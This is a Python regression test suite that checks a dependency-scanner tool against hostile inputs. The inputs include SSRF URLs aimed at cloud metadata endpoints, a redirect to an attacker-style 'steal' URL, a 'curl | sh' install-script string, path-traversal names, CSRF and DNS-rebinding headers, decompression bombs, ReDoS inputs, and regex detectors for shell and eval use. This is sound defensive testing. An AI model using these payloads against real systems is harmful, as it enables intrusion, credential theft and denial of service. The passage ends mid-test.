"""Regression tests for the security audit (no network, no real registries).

Each section names the class of issue it guards. Hostile inputs are the point: package names, lockfile
contents, registry responses and HTTP requests here are all attacker-shaped.
"""
from __future__ import annotations

import asyncio
import gzip
import html as htmllib
import io
import json
import os
import re
import threading
import time
from html.parser import HTMLParser
from pathlib import Path

import httpx
import pytest
from fastapi.testclient import TestClient
from rich.console import Console

from helpers_sample import fake_engine, ripple_home, sample_scan  # noqa: F401
from ripple import security
from ripple.config import DEFAULT_REGISTRIES, parse_settings
from ripple.models import EvidenceItem, Remediation, RiskDriver, ScanOptions
from ripple.parsers import base as parsers_base
from ripple.parsers import parse_file
from ripple.parsers.base import MAX_PACKAGES, LockfileParseError
from ripple.registries import (
    CratesRegistry, GoRegistry, NpmRegistry, PyPIRegistry, ReadOnlyClient, RegistryError, RegistrySet,
    ResponseCache,
)
from ripple.registries.base import RegistryRecord, probe
from ripple.reports import render
from ripple.reports.csv import safe_cell
from ripple.reports.rich import render_scan, render_to_text
from ripple.server import store
from ripple.server.app import BodyLimitMiddleware, _static_file, create_app, safe_filename
from ripple.server.jobs import JobManager

ROOT = Path(__file__).resolve().parents[1] / "ripple"
ESC = "\x1b"


# =========================================================================================================
# helpers
# =========================================================================================================

class Recorder:
    def __init__(self, handler):
        self.handler = handler
        self.requests: list[httpx.Request] = []

    def transport(self):
        def h(req: httpx.Request) -> httpx.Response:
            self.requests.append(req)
            return self.handler(req)

        return httpx.MockTransport(h)


async def _nosleep(_s: float) -> None:
    return None


class _RawStream(httpx.AsyncByteStream):
    """Body delivered as raw (still content-encoded) chunks, like a real socket - decoding happens on read."""

    def __init__(self, body: bytes, chunk: int = 4096):
        self.body, self.chunk = body, chunk

    async def __aiter__(self):
        for i in range(0, len(self.body), self.chunk):
            yield self.body[i:i + self.chunk]


def raw_response(body: bytes, status: int = 200, **headers) -> httpx.Response:
    return httpx.Response(status, headers=headers, stream=_RawStream(body))


def mk_client(rec: Recorder, **kw) -> ReadOnlyClient:
    kw.setdefault("rps", 1000)
    return ReadOnlyClient(transport=rec.transport(), sleep=_nosleep, **kw)


def hostile_scan(payload: str):
    """A scan whose every attacker-influenced string field carries ``payload``."""
    res = sample_scan()
    findings = []
    for f in res.findings:
        findings.append(f.model_copy(update=dict(
            title=payload, summary=payload, why_flagged=payload, attack_vector=payload, package=payload,
            version=payload, related_package=payload, dependency_source=payload, registry=payload,
            evidence=[EvidenceItem(label=payload, value=payload)],
            drivers=[RiskDriver(label=payload, points=5, detail=payload)],
            remediation=[Remediation(title=payload, detail=payload)])))
    return res.model_copy(update=dict(project=payload, findings=findings, warnings=[payload],
                                      id="scan-hostile-0001"))


# =========================================================================================================
# 1. SSRF: registry URLs (settings / options) and request targets
# =========================================================================================================

@pytest.mark.parametrize("url", [
    "http://169.254.169.254/latest/meta-data",       # AWS/Azure/GCP metadata (link-local)
    "http://169.254.170.2/v2/credentials",           # ECS task metadata
    "http://[fe80::1]/",                             # IPv6 link-local
    "http://[::ffff:169.254.169.254]/",              # IPv4-mapped IPv6
    "http://2852039166/",                            # decimal form of 169.254.169.254
    "http://0xa9fea9fe/",                            # hex form
    "http://0251.0376.0251.0376/",                   # octal form
    "http://169.254.43518/",                         # mixed form
    "http://100.100.100.200/",                       # Alibaba metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://0.0.0.0:8787/",
    "https://user:secret@registry.example/",         # credentials in URL
    "ftp://registry.example/",
    "file:///etc/passwd",
    "javascript:alert(1)",
    "https://registry.example/?token=1",             # query
    "https://registry.example/#frag",
    "https://registry.example:99999/",
    "https://",
    "https://reg istry.example/",
    "https://registry.example/\x00",
])
def test_settings_reject_dangerous_registry_urls(url):
    with pytest.raises(ValueError):
        parse_settings({"registries": {"npm": url}})


def test_settings_accept_private_mirrors_and_normalise():
    s = parse_settings({"registries": {"npm": "https://npm.corp.example/repo/", "pypi": "http://localhost:4873",
                                       "go": "http://10.0.0.5:3000", "rust": "http://[::1]:8080"}})
    assert s.registries["npm"] == "https://npm.corp.example/repo"
    assert s.registries["pypi"] == "http://localhost:4873"
    assert s.registries["go"] == "http://10.0.0.5:3000"
    assert s.registries["rust"] == "http://[::1]:8080"


def test_settings_file_with_metadata_url_falls_back_to_defaults(ripple_home):
    ripple_home.mkdir(parents=True, exist_ok=True)
    (ripple_home / "settings.json").write_text(json.dumps({"registries": {"npm": "http://169.254.169.254/"}}))
    from ripple.config import load_settings

    assert load_settings().registries == DEFAULT_REGISTRIES          # tampered file is ignored, not trusted


def test_live_registry_set_ignores_bad_overrides():
    opts = ScanOptions(live=True, registry_overrides={"npm": "http://169.254.169.254/", "pypi": "ftp://x/",
                                                       "go": "https://goproxy.corp.example"})
    rs = RegistrySet.live(opts)
    assert rs.npm.base_url == "https://registry.npmjs.org"
    assert rs.pypi.base_url == "https://pypi.org"
    assert rs.go.base_url == "https://goproxy.corp.example"


async def test_client_refuses_metadata_ip_targets_without_sending():
    rec = Recorder(lambda r: httpx.Response(200, json={}))
    c = mk_client(rec)
    for url in ("http://169.254.169.254/latest/", "http://[fe80::1]/x", "http://2852039166/", "http://metadata.google.internal/"):
        with pytest.raises(RegistryError):
            await c.fetch_text(url)
    assert rec.requests == []


async def test_dns_name_resolving_to_link_local_is_refused(monkeypatch):
    loop = asyncio.get_running_loop()

    async def fake_getaddrinfo(host, port, **kw):
        return [(2, 1, 6, "", ("169.254.169.254", port))]

    monkeypatch.setattr(loop, "getaddrinfo", fake_getaddrinfo)
    with pytest.raises(ValueError):
        await security.assert_public_target("rebind.attacker.example", 443)
    await security.assert_public_target("registry.npmjs.org", 443, resolve=False)   # trusted defaults skip DNS


async def test_dns_name_resolving_to_public_or_private_is_allowed(monkeypatch):
    loop = asyncio.get_running_loop()

    async def fake_getaddrinfo(host, port, **kw):
        return [(2, 1, 6, "", ("10.1.2.3", port)), (2, 1, 6, "", ("93.184.216.34", port))]

    monkeypatch.setattr(loop, "getaddrinfo", fake_getaddrinfo)
    await security.assert_public_target("mirror.corp.example", 443)


async def test_redirect_to_other_host_is_refused():
    rec = Recorder(lambda r: httpx.Response(302, headers={"location": "https://evil.example/steal"})
                   if r.url.host == "registry.example" else httpx.Response(200, text="pwned"))
    with pytest.raises(RegistryError, match="different host"):
        await mk_client(rec).fetch_text("https://registry.example/pkg")
    assert [r.url.host for r in rec.requests] == ["registry.example"]      # the second host was never contacted


async def test_redirect_to_metadata_ip_is_refused():
    rec = Recorder(lambda r: httpx.Response(302, headers={"location": "http://169.254.169.254/latest/meta-data/"}))
    with pytest.raises(RegistryError):
        await mk_client(rec).fetch_text("https://registry.example/pkg")
    assert len(rec.requests) == 1


async def test_same_host_redirect_is_followed_and_downgrade_is_not():
    def h(req):
        if req.url.path == "/Foo":
            return httpx.Response(301, headers={"location": "/foo"})
        if req.url.path == "/down":
            return httpx.Response(302, headers={"location": "http://registry.example/x"})
        return httpx.Response(200, text="ok")

    rec = Recorder(h)
    c = mk_client(rec)
    assert await c.fetch_text("https://registry.example/Foo") == "ok"
    with pytest.raises(RegistryError):
        await c.fetch_text("https://registry.example/down")             # https -> http downgrade


async def test_redirect_loop_is_bounded():
    rec = Recorder(lambda r: httpx.Response(302, headers={"location": "/again"}))
    with pytest.raises(RegistryError, match="redirects"):
        await mk_client(rec).fetch_text("https://registry.example/x")
    assert len(rec.requests) <= 7


async def test_response_size_is_capped_while_streaming():
    rec = Recorder(lambda r: raw_response(b"x" * 50_000))
    with pytest.raises(RegistryError, match="too large"):
        await mk_client(rec, max_response_bytes=10_000).fetch_text("https://registry.example/big")


async def test_gzip_bomb_is_capped_after_decompression():
    bomb = gzip.compress(b"0" * 5_000_000)
    assert len(bomb) < 20_000
    rec = Recorder(lambda r: raw_response(bomb, **{"content-encoding": "gzip"}))
    with pytest.raises(RegistryError, match="too large"):
        await mk_client(rec, max_response_bytes=100_000).fetch_text("https://registry.example/bomb")


async def test_corrupt_content_encoding_is_a_registry_error_not_a_crash():
    rec = Recorder(lambda r: raw_response(b"not gzip at all", **{"content-encoding": "gzip"}))
    with pytest.raises(RegistryError):
        await mk_client(rec).fetch_text("https://registry.example/x")


async def test_declared_content_length_over_cap_is_refused_early():
    rec = Recorder(lambda r: httpx.Response(200, content=b"x" * 10, headers={"content-length": "999999999"}))
    with pytest.raises(RegistryError):
        await mk_client(rec, max_response_bytes=1000).fetch_text("https://registry.example/x")


async def test_deeply_nested_json_response_is_a_registry_error():
    rec = Recorder(lambda r: httpx.Response(200, text="[" * 200_000 + "]" * 200_000))
    with pytest.raises(RegistryError, match="Malformed"):
        await mk_client(rec).fetch_json("https://registry.example/x")


async def test_probe_uses_readonly_client_and_blocks_metadata():
    assert await probe("http://169.254.169.254/") is False


def test_no_raw_httpx_or_unsafe_client_settings_anywhere():
    """Structural guard: outbound HTTP exists only in registries/base.py, TLS is never disabled, redirects are
    never auto-followed, and nothing evals / unpickles / shells out."""
    offenders: list[str] = []
    patterns = {
        r"\bhttpx\.(get|post|put|patch|delete|head|request|stream|Client|AsyncClient)\b": "raw httpx use",
        r"\bimport (requests|aiohttp|urllib\.request|http\.client|urllib3)\b|\burlopen\(|\brequests\.(get|post|put|delete|patch|Session)\(": "other HTTP stack",
        r"verify\s*=\s*False": "TLS verification disabled",
        r"follow_redirects\s*=\s*True": "automatic redirects",
        r"\b(pickle|marshal|shelve)\b": "unsafe deserialisation",
        r"\byaml\.load\(": "yaml.load",
        r"(?<![\w.])(eval|exec)\(": "eval/exec",
        r"\bos\.system\(|\bsubprocess\b|shell\s*=\s*True": "shell execution",
        r"ssl\._create_unverified_context|CERT_NONE|check_hostname\s*=\s*False": "TLS checks disabled",
    }
    for path in ROOT.rglob("*.py"):
        rel = path.relative_to(ROOT).as_posix()
        text = path.read_text(encoding="utf-8")
        for pat, what in patterns.items():
            for m in re.finditer(pat, text):
                line = text.count("\n", 0, m.start()) + 1
                if rel == "registries/base.py" and what == "raw httpx use":
                    continue                                     # the one hardened client lives here
                if rel == "security.py" and what == "other HTTP stack":
                    continue
                offenders.append(f"{rel}:{line}: {what}: {m.group(0)}")
    assert offenders == []


# =========================================================================================================
# 2. registry name -> URL path safety, malformed registry data, untrusted text from registries
# =========================================================================================================

BAD_NAMES = ["../../etc/passwd", "a/../b", "a?b", "a#b", "a b", "a\x00b", "%2e%2e", "a\\b", "", "x" * 400,
             "@scope/../evil", "a\nb", "a:b"]


@pytest.mark.parametrize("name", BAD_NAMES)
async def test_registries_never_put_hostile_names_in_urls(name):
    rec = Recorder(lambda r: httpx.Response(404))
    c = mk_client(rec)
    for reg in (NpmRegistry(c), PyPIRegistry(c), CratesRegistry(c), GoRegistry(c)):
        assert await reg.get_package(name) is None
    assert rec.requests == [], [str(r.url) for r in rec.requests]


async def test_path_components_are_percent_encoded():
    rec = Recorder(lambda r: httpx.Response(404))
    c = mk_client(rec)
    await PyPIRegistry(c).get_package("caf\u00e9")
    await CratesRegistry(c).get_package("caf\u00e9")
    assert all("\u00e9" not in str(r.url) and "%C3%A9" in str(r.url) for r in rec.requests)


async def test_go_versions_from_registry_are_validated_before_use_in_urls():
    seen: list[str] = []

    def h(req):
        seen.append(req.url.raw_path.decode())
        if req.url.path.endswith("/@latest"):
            return httpx.Response(200, json={"Version": "v1.0.0", "Time": "2020-01-01T00:00:00Z"})
        if req.url.path.endswith("/@v/list"):
            return httpx.Response(200, text="../../../../etc/passwd\nv1.0.0\n")
        return httpx.Response(200, json={"Time": "2020-01-01T00:00:00Z"})

    rec = Recorder(h)
    rec_out = await GoRegistry(mk_client(rec)).get_package("example.com/mod")
    assert rec_out is not None and rec_out.versions == ["v1.0.0"]
    assert not any(".." in p for p in seen)


NPM_HOSTILE_DOCS = [
    {"versions": {"1.0.0": {"scripts": ["postinstall"]}}, "dist-tags": {"latest": "1.0.0"}, "time": {"1.0.0": "2020-01-01T00:00:00Z"}},
    {"versions": {"1.0.0": {"scripts": {"postinstall": 5}}}, "dist-tags": {"latest": "1.0.0"}, "time": {"1.0.0": "2020-01-01T00:00:00Z"}},
    {"versions": {"1.0.0": "not-a-dict"}, "dist-tags": {"latest": "1.0.0"}, "time": {"1.0.0": "2020-01-01T00:00:00Z"}},
    {"versions": [], "dist-tags": [], "time": "x", "maintainers": "x"},
    {"maintainers": [{"name": {"a": 1}}], "versions": {}},
    {"dist-tags": {"latest": 123}, "versions": {"123": {}}, "time": {"123": "x"}},
]


@pytest.mark.parametrize("doc", NPM_HOSTILE_DOCS)
async def test_malformed_npm_documents_never_crash_the_scan(doc):
    rec = Recorder(lambda r: httpx.Response(200, json=doc))
    try:
        await NpmRegistry(mk_client(rec)).get_package("pkg")
    except RegistryError:
        pass                                                     # acceptable: reported as an unverifiable package


async def test_malformed_pypi_and_crates_documents_become_registry_errors():
    rec = Recorder(lambda r: httpx.Response(200, json={"info": {"version": ["x"], "classifiers": 5}, "releases": []}))
    with pytest.raises(RegistryError):
        await PyPIRegistry(mk_client(rec)).get_package("pkg")
    rec2 = Recorder(lambda r: httpx.Response(200, text='{"crate": {"recent_downloads": Infinity}, "versions": []}'))
    with pytest.raises(RegistryError):
        await CratesRegistry(mk_client(rec2)).get_package("pkg")


def test_registry_record_strips_terminal_and_bidi_tricks():
    rec = RegistryRecord(
        ecosystem="npm", name="x", description="ok\n! CRITICAL forged line" + ESC + "[2J\u202e",
        maintainers=["alice" + ESC + "]0;pwn\x07", "bob\r\nmallory"], repository_url="https://x.example/\x00r",
        network_indicators=["curl\tin postinstall" + ESC], versions=["1.0.0" + ESC],
        install_scripts={"postinstall": "curl x | sh\n" + ESC + "[31m"})
    blob = json.dumps(rec.model_dump(mode="json"), ensure_ascii=False)
    assert ESC not in blob and "\u202e" not in blob and "\x07" not in blob and "\x00" not in blob
    assert "\n" not in rec.description and "\r" not in "".join(rec.maintainers)
    assert "\\x1b" in rec.description and "\\u202e" in rec.description        # made visible, not silently dropped


def test_response_cache_ignores_future_and_tampered_entries(tmp_path):
    clock = {"t": 1000.0}
    cache = ResponseCache(tmp_path, ttl=60, clock=lambda: clock["t"])
    url = "https://registry.example/x"
    path = cache._path(cache._key(url))
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps({"ts": 10_000_000.0, "status": 200, "url": url, "body": "poison"}))   # far in the future
    assert cache.get(url) is None
    path.write_text(json.dumps({"ts": 1000.0, "status": 500, "url": url, "body": "x"}))               # non-cacheable status
    assert cache.get(url) is None
    path.write_text(json.dumps({"ts": 1000.0, "status": 200, "url": url, "body": {"not": "a string"}}))
    assert ResponseCache(tmp_path, ttl=60, clock=lambda: 1001.0).get(url) is None
    cache.put(url, 200, "fine")
    assert ResponseCache(tmp_path, ttl=60, clock=lambda: 1001.0).get(url) == (200, "fine")


def test_cache_file_names_are_hashes_never_derived_from_names(tmp_path):
    cache = ResponseCache(tmp_path, ttl=60)
    cache.put("https://registry.example/../../../../evil?x=%00", 200, "b")
    files = [p for p in tmp_path.rglob("*") if p.is_file()]
    assert len(files) == 1 and re.fullmatch(r"[0-9a-f]{64}\.json", files[0].name)
    assert tmp_path in files[0].parents


# =========================================================================================================
# 3. untrusted text: escape_controls
# =========================================================================================================

def test_escape_controls_neutralises_terminal_bidi_and_zero_width():
    out = security.escape_controls("a" + ESC + "[2Jb\x07\x9b\u202e\u200b\ufeff\x7fc")
    assert all(ch.isprintable() for ch in out)
    assert "\\x1b" in out and "\\u202e" in out and "\\u200b" in out and "\\x9b" in out and "\\x7f" in out
    assert security.escape_controls("line1\nline2\r\n\ttab") == "line1 line2   tab"     # every break -> one space
    assert security.escape_controls("multi\nline", flatten=False) == "multi\nline"
    assert security.escape_controls("caf\u00e9 \u4e2d\u6587 \U0001F600") == "caf\u00e9 \u4e2d\u6587 \U0001F600"
    assert security.escape_controls(None) == ""
    assert security.clean_label("x" * 500, 20).endswith("\u2026") and len(security.clean_label("x" * 500, 20)) == 20


# =========================================================================================================
# 4. lockfile parsing: resource exhaustion, hostile structure, hostile names
# =========================================================================================================

def _timed(fn, budget=3.0):
    t0 = time.perf_counter()
    try:
        fn()
    except LockfileParseError:
        pass
    assert time.perf_counter() - t0 < budget


def test_deeply_nested_json_and_toml_are_friendly_errors():
    for name, data in (("package-lock.json", "[" * 100_000 + "]" * 100_000),
                       ("Pipfile.lock", '{"default":' * 50_000 + "{}" + "}" * 50_000),
                       ("Cargo.lock", "a = " + "[" * 100_000 + "]" * 100_000),
                       ("pyproject.toml", "a = " + "[" * 100_000 + "]" * 100_000)):
        with pytest.raises(LockfileParseError):
            parse_file(name, data)


def test_unknown_filename_with_deep_json_is_not_a_crash():
    with pytest.raises(LockfileParseError):
        parse_file("mystery.lock", "{" * 100_000)


WRONG_TYPES = [
    ("pyproject.toml", '[tool.poetry]\ndependencies = "x"\n'),
    ("pyproject.toml", '[project]\ndependencies = "x"\n[tool.poetry.group]\nmain = 3\n'),
    ("Pipfile.lock", json.dumps({"default": {"a": {"hashes": "x", "version": "==1", "index": ["x"]}}, "_meta": {"sources": "x"}})),
    ("Pipfile.lock", json.dumps({"default": [], "develop": 5})),
    ("package-lock.json", json.dumps({"lockfileVersion": 3, "packages": {"": {"dependencies": "x"}, "node_modules/a": {"version": {"x": 1}, "dependencies": "z", "integrity": {"y": 1}}}})),
    ("package-lock.json", json.dumps({"lockfileVersion": 1, "dependencies": {"a": {"version": 5, "requires": 7, "dependencies": []}}})),
    ("Cargo.lock", 'version = 3\n[[package]]\nname = ["x"]\nversion = 1\n'),
    ("Cargo.lock", 'version = 3\n[[package]]\nname = "a"\ndependencies = [1, 2]\n'),
    ("yarn.lock", "# yarn lockfile v1\n\n\x00\x00:\n  version\n"),
]


@pytest.mark.parametrize("name,content", WRONG_TYPES)
def test_wrong_types_in_lockfiles_raise_parse_errors_only(name, content):
    try:
        parse_file(name, content)
    except LockfileParseError:
        pass


def test_package_count_cap_gives_friendly_error():
    text = "".join(f"pkg{i}==1.0.{i}\n" for i in range(MAX_PACKAGES + 1))
    with pytest.raises(LockfileParseError, match="more than"):
        parse_file("requirements.txt", text)
    sums = "".join(f"example.com/m{i} v1.0.0 h1:abc=\n" for i in range(MAX_PACKAGES + 1))
    with pytest.raises(LockfileParseError, match="more than"):
        parse_file("go.sum", sums)


async def test_engine_caps_packages_across_files():
    from ripple.engine import ScanInput, run_scan

    half = MAX_PACKAGES // 2 + 10
    a = "".join(f"a{i}==1.0\n" for i in range(half))
    b = "".join(f"b{i}==1.0\n" for i in range(half))
    with pytest.raises(LockfileParseError, match="more than"):
        await run_scan([ScanInput("requirements.txt", a), ScanInput("requirements-dev.txt", b)], ScanOptions())


def test_absurd_names_and_versions_are_rejected():
    with pytest.raises(LockfileParseError):
        parse_file("requirements.txt", "a" * 5000 + "==1\n")
    with pytest.raises(LockfileParseError):
        parse_file("requirements.txt", "pkg==" + "1" * 5000 + "\n")


def test_control_characters_in_package_names_are_neutralised():
    lock = json.dumps({"lockfileVersion": 3, "packages": {
        "": {"dependencies": {"evil": "1"}},
        "node_modules/evil\x1b[2J\x1b]0;pwn\x07\u202e": {"version": "1.0.0\x1b[31m", "resolved": "https://x.example/\x1b[0m"}}})
    pkgs = parse_file("package-lock.json", lock).packages
    blob = json.dumps([p.model_dump(mode="json") for p in pkgs], ensure_ascii=False)
    assert ESC not in blob and "\x07" not in blob and "\u202e" not in blob


def test_cargo_lock_with_thousands_of_versions_of_one_crate_is_fast():
    n = 8000
    text = "version = 3\n" + "".join(
        f'[[package]]\nname = "c"\nversion = "1.0.{i}"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\n'
        f'dependencies = ["c 1.0.{i}"]\n\n' for i in range(n))
    t0 = time.perf_counter()
    assert len(parse_file("Cargo.lock", text).packages) == n
    assert time.perf_counter() - t0 < 3.0            # was O(n^2): ~6 s at this size before the (name, version) index


def test_merging_huge_dependency_lists_is_linear():
    from ripple.engine import _merge_lockfiles
    from ripple.models import Ecosystem
    from ripple.parsers.base import ParsedLockfile, make_id, merge_duplicate, new_package

    deps = [f"npm:d{i}@1.0.0" for i in range(60_000)]
    a = new_package(Ecosystem.NPM, "a", "1.0.0", "x")
    b = new_package(Ecosystem.NPM, "a", "1.0.0", "y")
    a.dependencies, b.dependencies = list(deps), list(reversed(deps))
    t0 = time.perf_counter()
    merge_duplicate(a, b)
    lf1 = ParsedLockfile("x", Ecosystem.NPM, "package-lock.json", packages=[a])
    b2 = new_package(Ecosystem.NPM, "a", "1.0.0", "z")
    b2.dependencies = list(reversed(deps))
    lf2 = ParsedLockfile("z", Ecosystem.NPM, "package-lock.json", packages=[b2])
    merged, _ = _merge_lockfiles([lf1, lf2])
    assert time.perf_counter() - t0 < 3.0
    assert len(merged[0].dependencies) == 60_000 and make_id("npm", "a", "1.0.0") == merged[0].id


ADVERSARIAL = [
    ("package-lock.json", json.dumps({"lockfileVersion": 3, "packages": {"": {}, "node_modules/a": {"version": "1.0.0", "resolved": "https://x/" + "a/-/" * 300_000}}})),
    ("package-lock.json", json.dumps({"lockfileVersion": 3, "packages": {"": {}, "node_modules/a": {"version": "1.0.0", "resolved": "https://x/" + "-/" * 500_000 + ".tgz"}}})),
    ("package-lock.json", json.dumps({"lockfileVersion": 3, "packages": {"": {}, "node_modules/a": {"version": "1.0.0", "resolved": "git+ssh://" + "a" * 2_000_000}}})),
    ("yarn.lock", "# yarn lockfile v1\n\n" + "a@1, " * 300_000 + ":\n  version \"1\"\n"),
    ("yarn.lock", "# yarn lockfile v1\n\n" + '"' * 2_000_000 + ":\n  version \"1\"\n"),
    ("yarn.lock", '# yarn lockfile v1\n\na@1:\n  version "1"\n  dependencies:\n    ' + " " * 2_000_000 + "x y\n"),
    ("requirements.txt", "a" * 2_000_000 + "!\n"),
    ("requirements.txt", "a" + " " * 2_000_000 + "#\n"),
    ("requirements.txt", "a==1 " + "--hash=sha256:abcd " * 100_000 + "\n"),
    ("requirements.txt", "a==1 \\\n" * 300_000),
    ("requirements.txt", "a==1\n" + "    # via b\n" * 300_000),
    ("requirements.txt", "a[" + "x" * 2_000_000 + "\n"),
    ("requirements.txt", "a==1;" * 300_000 + "\n"),
    ("requirements.txt", "-e git+https://" + "a" * 2_000_000 + "\n"),
    ("requirements.txt", "git+https://x/y#egg=" + "a" * 2_000_000 + "\n"),
    ("go.mod", "module x\nrequire " + "a" * 2_000_000 + " v1\n"),
    ("go.mod", "module x\nrequire " + '"' * 2_000_000 + " v1\n"),
    ("go.mod", "module x\nrequire (\n" + "\t// c\n" * 300_000 + ")\n"),
    ("Cargo.lock", 'version = 3\n[[package]]\nname = "' + "a" * 2_000_000 + '"\nversion = "1"\n'),
    ("pyproject.toml", '[project]\nname="x"\ndependencies=["' + "a" * 2_000_000 + '"]\n'),
    ("pyproject.toml", '[project]\nname="x"\ndependencies=["a @ ' + "b" * 2_000_000 + '"]\n'),
]


@pytest.mark.parametrize("name,content", ADVERSARIAL, ids=[f"{n}-{i}" for i, (n, _) in enumerate(ADVERSARIAL)])
def test_redos_and_quadratic_smoke(name, content):
    """Adversarial single-line/megabyte inputs must finish quickly (linear behaviour) or fail cleanly."""
    _timed(lambda: parse_file(name, content))


async def test_project_name_from_lockfile_is_sanitised_and_type_checked():
    from ripple.engine import ScanInput, run_scan

    weird = json.dumps({"name": {"nested": "object"}, "lockfileVersion": 3, "packages": {"": {}, "node_modules/a": {"version": "1.0.0"}}})
    res = await run_scan([ScanInput("package-lock.json", weird)], ScanOptions())
    assert isinstance(res.project, str) and res.project
    hostile = json.dumps({"name": "proj" + ESC + "[2J\n" + "x" * 500, "lockfileVersion": 3, "packages": {"": {}, "node_modules/a": {"version": "1.0.0"}}})
    res = await run_scan([ScanInput("package-lock.json", hostile)], ScanOptions())
    assert ESC not in res.project and "\n" not in res.project and len(res.project) <= 120


# =========================================================================================================
# 5. HTTP server
# =========================================================================================================

@pytest.fixture()
def client(ripple_home, fake_engine):
    return TestClient(create_app(jobs=JobManager()))


def _post_scan(c, headers=None, name="package-lock.json", content=b"{}"):
    return c.post("/api/scans", files=[("files", (name, content))], headers=headers or {})


@pytest.mark.parametrize("host", ["evil.example", "localhost:8787@evil.example", "evil.example:8787", "127.0.0.1.evil.example",
                                  "", "localhost evil", "[::1", "localhost:80:80", "127.0.0.1\r\nX: y", "0.0.0.0:8787"])
def test_dns_rebinding_host_header_rejected(client, host):
    r = client.get("/api/health", headers={"host": host})
    assert r.status_code == 400 and r.json()["error"]["code"] == "invalid_host"


@pytest.mark.parametrize("host", ["localhost", "localhost:8787", "127.0.0.1:8787", "[::1]:8787", "LOCALHOST:8787"])
def test_loopback_host_headers_accepted(client, host):
    assert client.get("/api/health", headers={"host": host}).status_code == 200


def test_host_check_also_guards_static_and_error_paths(ripple_home, fake_engine, tmp_path):
    (tmp_path / "index.html").write_text("<title>ui</title>")
    c = TestClient(create_app(static_dir=tmp_path))
    assert c.get("/", headers={"host": "evil.example"}).status_code == 400
    assert c.get("/api/nope", headers={"host": "evil.example"}).status_code == 400


@pytest.mark.parametrize("method", ["post", "put", "delete"])
def test_csrf_foreign_and_null_origins_blocked_on_every_state_changing_verb(client, method):
    for origin in ("http://evil.example", "null", "https://localhost:8787.evil.example", "http://localhost:5176"):
        if method == "post":
            r = _post_scan(client, {"origin": origin})
        elif method == "put":
            r = client.put("/api/settings", json={}, headers={"origin": origin})
        else:
            r = client.delete("/api/scans/anything", headers={"origin": origin})
        assert r.status_code == 403 and r.json()["error"]["code"] == "forbidden_origin", (method, origin)


def test_csrf_cross_site_fetch_without_origin_blocked_but_cli_clients_work(client):
    assert _post_scan(client, {"sec-fetch-site": "cross-site"}).status_code == 403
    assert _post_scan(client, {"sec-fetch-site": "same-site"}).status_code == 403
    assert _post_scan(client, {"sec-fetch-site": "same-origin"}).status_code == 202
    assert _post_scan(client, {"sec-fetch-site": "none"}).status_code == 202
    assert _post_scan(client).status_code == 202                              # curl / scripts: no browser headers
    assert _post_scan(client, {"origin": "http://localhost:5175", "sec-fetch-site": "cross-site"}).status_code == 202  # dev UI


def test_csrf_cannot_change_settings_cross_origin(client):
    before = client.get("/api/settings").json()
    r = client.put("/api/settings", json={"registries": {"npm": "https://evil.example"}},
                   headers={"origin": "http://evil.example"})
    assert r.status_code == 403
    assert client.get("/api/settings").json() == before


def test_settings_api_rejects_ssrf_targets_and_oversized_bodies(client):
    r = client.put("/api/settings", json={"registries": {"npm": "http://169.254.169.254/latest"}})
    assert r.status_code == 422 and "169.254" not in r.text.replace("invalid registry URL", "")
    r = client.put("/api/settings", json={"registries": {"pypi": "https://user:pw@evil.example"}})
    assert r.status_code == 422
    big = client.put("/api/settings", content=b'{"scanner":{"internal_scopes":["' + b"a" * 400_000 + b'"]}}',
                     headers={"content-type": "application/json"})
    assert big.status_code == 413 and big.json()["error"]["code"] == "payload_too_large"
    assert client.get("/api/settings").json()["registries"] == DEFAULT_REGISTRIES


def test_options_validation_bounds(client):
    def opts(**o):
        return client.post("/api/scans", files=[("files", ("package-lock.json", b"{}"))], data={"options": json.dumps(o)})

    assert opts(cache_ttl_s=-5).status_code == 422
    assert opts(cache_ttl_s=10 ** 9).status_code == 422
    assert opts(rate_limit_rps=10 ** 6).status_code == 422
    assert opts(max_edit_distance=99).status_code == 422
    assert opts(internal_scopes=["@" + "a" * 1000] * 200).status_code == 202       # clipped, not rejected


def test_project_name_from_api_is_sanitised(client, fake_engine):
    r = client.post("/api/scans", files=[("files", ("package-lock.json", b"{}"))],
                    data={"project": "p" + ESC + "[2J\r\nname"})
    assert r.status_code == 202
    JobManager  # noqa: B018
    project = fake_engine.calls[-1][1] if fake_engine.calls else None
    deadline = time.time() + 5
    while project is None and time.time() < deadline:
        time.sleep(0.02)
        project = fake_engine.calls[-1][1] if fake_engine.calls else None
    assert project and ESC not in project and "\n" not in project and "\r" not in project


class _Sink:
    def __init__(self):
        self.messages: list[dict] = []

    async def __call__(self, m):
        self.messages.append(m)


async def test_body_limit_middleware_stops_reading_chunked_bodies():
    consumed = {"n": 0}

    async def app(scope, receive, send):
        while True:
            msg = await receive()
            if not msg.get("more_body"):
                break
        await send({"type": "http.response.start", "status": 200, "headers": []})
        await send({"type": "http.response.body", "body": b"ok"})

    async def receive():
        consumed["n"] += 1
        await asyncio.sleep(0)
        return {"type": "http.request", "body": b"x" * 100, "more_body": True}

    sink = _Sink()
    mw = BodyLimitMiddleware(app, max_bytes=1000)
    await mw({"type": "http", "method": "POST", "path": "/api/scans", "headers": [(b"transfer-encoding", b"chunked")]},
             receive, sink)
    start = sink.messages[0]
    assert start["status"] == 413
    assert consumed["n"] <= 12                       # stopped right after crossing the limit, did not drain the stream
    sink2 = _Sink()
    await mw({"type": "http", "method": "POST", "path": "/api/scans", "headers": [(b"content-length", b"5000")]},
             receive, sink2)
    assert sink2.messages[0]["status"] == 413


def test_chunked_oversize_upload_is_rejected_end_to_end(ripple_home, fake_engine):
    c = TestClient(create_app(max_upload_bytes=1024))
    boundary = "b0undary"

    def gen():
        yield f"--{boundary}\r\nContent-Disposition: form-data; name=\"files\"; filename=\"package-lock.json\"\r\n\r\n".encode()
        for _ in range(2000):
            yield b"x" * 1024
        yield f"\r\n--{boundary}--\r\n".encode()

    r = c.post("/api/scans", content=gen(), headers={"content-type": f"multipart/form-data; boundary={boundary}"})
    assert r.status_code == 413 and r.json()["error"]["code"] == "payload_too_large"


@pytest.mark.parametrize("scan_id", ["..%2f..%2fx", "CON", "nul", "com1", "a%0Ab", "a%20b", "x" * 200, "a.json", "a%2Fb",
                                     "a%5Cb", "%00", "%2e%2e", "%2e%2e%2f%2e%2e%2fsettings", "..%5c..%5csettings"])
def test_scan_id_traversal_and_device_names_are_404(client, scan_id):
    for path in (f"/api/scans/{scan_id}", f"/api/scans/{scan_id}/export?format=json"):
        r = client.get(path)
